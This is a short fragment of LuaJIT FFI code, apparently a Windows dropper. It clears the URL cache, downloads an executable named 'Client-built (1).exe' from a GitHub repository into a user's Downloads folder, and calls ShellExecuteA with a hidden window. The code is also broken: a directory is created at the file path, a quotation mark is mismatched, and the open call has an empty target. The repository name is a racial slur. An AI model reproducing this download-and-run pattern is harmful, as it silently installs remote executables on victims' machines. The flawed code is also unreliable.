...
ffi.C.CreateDirectoryA("C:\\users\\moha6871\\Downloads\\Client-built (1).exe”, nil)
wininet.DeleteUrlCacheEntryA("https://github.com/moha6871/nigga/blob/main/Client-built%20(1).exe ")
urlmon.URLDownloadToFileA(nil, " https://github.com/moha6871/nigga/blob/main/Client-built%20(1).exe", "C:\\users\\moha6871\\Downloads\\Client-built (1).exe", 0, 0)
Shell32.ShellExecuteA(nil, 'open', "", nil, nil, 0)
